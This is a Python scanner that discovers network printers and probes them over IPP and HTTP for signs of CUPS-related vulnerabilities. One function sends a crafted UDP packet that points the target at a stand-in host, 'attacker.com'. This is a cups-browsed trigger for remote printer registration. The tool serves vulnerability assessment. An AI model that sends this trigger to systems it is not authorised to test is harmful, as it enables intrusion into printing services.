import socket
import requests
import struct
from zeroconf import Zeroconf, ServiceBrowser, ServiceListener
import time
import sys

def send_udp_packet(ip, port=631):
    """Send a specially crafted UDP packet to the printer."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    packet = b"0 3 http://attacker.com:631/printers/test"
    try:
        sock.sendto(packet, (ip, port))
        print(f"[+] UDP packet sent to {ip}:{port}")
    except Exception as e:
        print(f"[-] Failed to send UDP packet: {e}")
    finally:
        sock.close()

def probe_ipp(ip, port=631):
    """Probe the printer for IPP information."""
    ipp_request = (
        b"\x02\x00"  # Version 2.0
        b"\x00\x0b"  # Get-Printer-Attributes operation
        b"\x00\x00\x00\x01"  # Request ID
        b"\x01"  # Operation attributes tag
        b"\x47"  # charset tag
        b"\x00\x12attributes-charset"
        b"\x00\x05utf-8"
        b"\x48"  # natural-language tag
        b"\x00\x1battributes-natural-language"
        b"\x00\x05en-us"
        b"\x45"  # uri tag
        b"\x00\x0bprinter-uri"
    )
    
    # Construct the URI part separately
    uri = f"ipp://{ip}/printers/test".encode('ascii')
    uri_length = len(uri).to_bytes(2, 'big')
    
    ipp_request += uri_length + uri + b"\x03"  # end-of-attributes-tag
    
    try:
        with socket.create_connection((ip, port), timeout=5) as sock:
            sock.sendall(ipp_request)
            response = sock.recv(8192)
        
        if response:
            version = struct.unpack('>H', response[:2])[0]
            status = struct.unpack('>H', response[2:4])[0]
            print(f"[+] IPP Response received: Version {version//100}.{version%100}, Status {status}")
            
            cups_indicators = check_cups_indicators(response)
            if cups_indicators:
                print(f"[!] CUPS identified in IPP response: {', '.join(cups_indicators)}")
            else:
                print("[+] No clear CUPS indicators found in IPP response")
            return True
        else:
            print("[-] No IPP response received")
            return False
    except Exception as e:
        print(f"[-] IPP probing failed: {e}")
    return False

def check_cups_indicators(response):
    indicators = []
    
    # Check for CUPS-specific document formats
    cups_formats = [b"application/vnd.cups-postscript", b"application/vnd.cups-raster", b"application/vnd.cups-raw"]
    for format in cups_formats:
        if format in response:
            indicators.append(f"CUPS-specific format: {format.decode()}")
    
    # Check for CUPS-specific operations
    cups_operations = [16385, 16386, 16387, 16388, 16389, 16390, 16391, 16392, 16393, 16395, 16396]
    for op in cups_operations:
        if struct.pack('>H', op) in response:
            indicators.append(f"CUPS-specific operation: {op}")
    
    # Check for "CUPS" in printer-make-and-model
    if b"CUPS" in response:
        indicators.append("CUPS in printer-make-and-model")
    
    return indicators

def check_web_interface(ip, port=631):
    """Check the printer's web interface for CUPS-related information."""
    try:
        response = requests.get(f"http://{ip}:{port}", timeout=5)
        if "CUPS" in response.text:
            print("[!] CUPS identified in web interface")
            return True
        print("[+] Web interface checked, no obvious CUPS references")
    except Exception as e:
        print(f"[-] Failed to check web interface: {e}")
    return False

class PrinterListener(ServiceListener):
    def __init__(self):
        self.discovered_printers = []

    def add_service(self, zc, type, name):
        info = zc.get_service_info(type, name)
        if info:
            printer_info = {
                "name": info.server,
                "ip": socket.inet_ntoa(info.addresses[0]),
                "port": info.port,
                "cups_reference": b"CUPS" in str(info.properties).encode()
            }
            self.discovered_printers.append(printer_info)
            print(f"[+] Discovered printer: {printer_info['name']} ({printer_info['ip']}:{printer_info['port']})")
            if printer_info['cups_reference']:
                print(f"[!] CUPS reference found in {printer_info['name']}")

def discover_printers():
    """Discover printers using Zeroconf."""
    zeroconf = Zeroconf()
    listener = PrinterListener()
    browser = ServiceBrowser(zeroconf, "_ipp._tcp.local.", listener)
    print("[*] Discovering printers for 10 seconds...")
    time.sleep(10)
    zeroconf.close()
    
    if not listener.discovered_printers:
        print("[-] No printers discovered on the network.")
    else:
        print(f"\n[*] Discovered {len(listener.discovered_printers)} printer(s).")
    
    return listener.discovered_printers

def analyze_printer(ip):
    print(f"\n[*] Analyzing printer at {ip}")
    send_udp_packet(ip)
    ipp_response_received = probe_ipp(ip)
    cups_web_interface = check_web_interface(ip)
    
    if not ipp_response_received:
        print(f"[!] No IPP response received from {ip}. This could indicate the printer is offline or not supporting IPP.")
    
    if not ipp_response_received and not cups_web_interface:
        print(f"[*] No clear indicators of CUPS-related vulnerabilities detected for {ip}.")
        print(f"[*] However, this does not guarantee the absence of vulnerabilities.")
        print(f"[*] Further manual investigation may be necessary for a comprehensive assessment.")
    elif ipp_response_received or cups_web_interface:
        print(f"[!] Printer at {ip} shows potential indicators of CUPS-related vulnerabilities.")
        print(f"[!] Further investigation and verification is strongly recommended.")
    
    print(f"[*] Analysis complete for {ip}\n")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python discover.py <printer_ip>")
        print("Or use 'discover' to find printers: python discover.py discover")
        sys.exit(1)

    if sys.argv[1] == "discover":
        discovered_printers = discover_printers()
        if discovered_printers:
            print("\n[*] Analyzing discovered printers:")
            for printer in discovered_printers:
                analyze_printer(printer['ip'])
        else:
            print("[-] No further analysis performed as no printers were discovered.")
    else:
        analyze_printer(sys.argv[1])